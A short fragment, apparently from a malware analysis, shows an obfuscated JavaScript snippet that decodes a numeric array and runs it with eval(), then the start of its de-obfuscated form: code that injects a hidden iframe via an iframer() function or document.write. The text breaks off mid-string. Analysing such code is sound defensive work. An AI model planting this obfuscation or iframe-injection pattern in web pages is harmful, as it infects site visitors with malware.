@@ -1,0 +1,9 @@
+t,113-t,64-t,119-t,82-t,95-t,101-t,76-t,95-t,107-t,99-t,38-t,37-t,96-t,109-t,98-t,119-t,37-t,39-t,89-t,46-t,91-t,44-t,95-t,110-t,110-t,99-t,108-t,98-t,65-t,102-t,103-t,106-t,98-t,38-t,100-t,39-t,57-t,7-t,7-t,123-t];for(i=0;i< n.length;i++)ss+=s(eval("n"+"["+"i]"));eval(ss);</sc ript>
+
+de-obfuscates to
+
+if (do​cument.getElementsByTagName('body')[0]){
+  iframer();
+}
+else {
+  do​cument.write("<if
